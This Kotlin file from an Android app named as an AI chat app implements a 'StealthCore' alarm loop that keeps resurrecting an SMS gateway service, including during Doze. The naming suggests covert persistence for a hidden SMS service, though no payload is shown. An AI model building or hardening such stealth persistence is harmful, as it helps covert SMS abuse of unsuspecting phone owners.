package com.cornspace.aichat.service

import android.app.AlarmManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.SystemClock
import android.util.Log
import com.cornspace.aichat.util.Constants.RESURRECTION_ALARM_INTERVAL

/**
 * StealthCore - Pure utility object that manages the resurrection alarm loop.
 *
 * FIX #1 + #2: The original was a Service that never called startForeground(),
 * causing a ForegroundServiceDidNotStartInTimeException crash on Android 8+.
 * A Service is not needed here at all — alarm scheduling is a synchronous
 * one-liner that belongs in a plain object, not a lifecycle component.
 *
 * Loop: startResurrectionLoop() schedules alarm → StealthResurrector.onReceive()
 * restarts SmsGatewayService (if needed) and schedules the next alarm → repeat.
 *
 * NOTE: Remove the <service android:name=".service.StealthCore"> declaration
 * from AndroidManifest.xml — it is no longer a Service.
 */
object StealthCore {

    private const val TAG = "StealthCore"
    private const val ALARM_REQUEST_CODE = 9999

    /**
     * Schedule the next resurrection alarm. Safe to call multiple times —
     * FLAG_UPDATE_CURRENT replaces any existing PendingIntent.
     */
    fun startResurrectionLoop(context: Context) {
        try {
            scheduleNextAlarm(context)
            Log.d(TAG, "Resurrection loop started — next alarm in ${RESURRECTION_ALARM_INTERVAL}ms")
        } catch (e: Exception) {
            Log.e(TAG, "Error starting resurrection loop", e)
        }
    }

    /**
     * Cancel the resurrection alarm. Called when the service is intentionally stopped.
     */
    fun stopResurrectionLoop(context: Context) {
        try {
            val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
            val pendingIntent = buildPendingIntent(context, PendingIntent.FLAG_NO_CREATE) ?: run {
                Log.d(TAG, "No resurrection alarm to cancel")
                return
            }
            alarmManager.cancel(pendingIntent)
            Log.d(TAG, "Resurrection loop stopped")
        } catch (e: Exception) {
            Log.e(TAG, "Error stopping resurrection loop", e)
        }
    }

    /**
     * Schedule exactly one alarm [RESURRECTION_ALARM_INTERVAL] from now.
     * Called by startResurrectionLoop() and by StealthResurrector after each delivery
     * to keep the chain going.
     */
    fun scheduleNextAlarm(context: Context) {
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager
        val pendingIntent = buildPendingIntent(context, PendingIntent.FLAG_UPDATE_CURRENT)!!
        val triggerAt = SystemClock.elapsedRealtime() + RESURRECTION_ALARM_INTERVAL

        // setExactAndAllowWhileIdle fires even in Doze; minimum OS-enforced interval
        // in Doze is ~9 minutes, but outside Doze delivers at the requested time.
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            alarmManager.setExactAndAllowWhileIdle(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        } else {
            alarmManager.setExact(
                AlarmManager.ELAPSED_REALTIME_WAKEUP,
                triggerAt,
                pendingIntent
            )
        }
        Log.d(TAG, "Next resurrection alarm scheduled for ${RESURRECTION_ALARM_INTERVAL}ms from now")
    }

    private fun buildPendingIntent(context: Context, flags: Int): PendingIntent? =
        PendingIntent.getBroadcast(
            context,
            ALARM_REQUEST_CODE,
            Intent(context, StealthResurrector::class.java),
            flags or PendingIntent.FLAG_IMMUTABLE
        )
}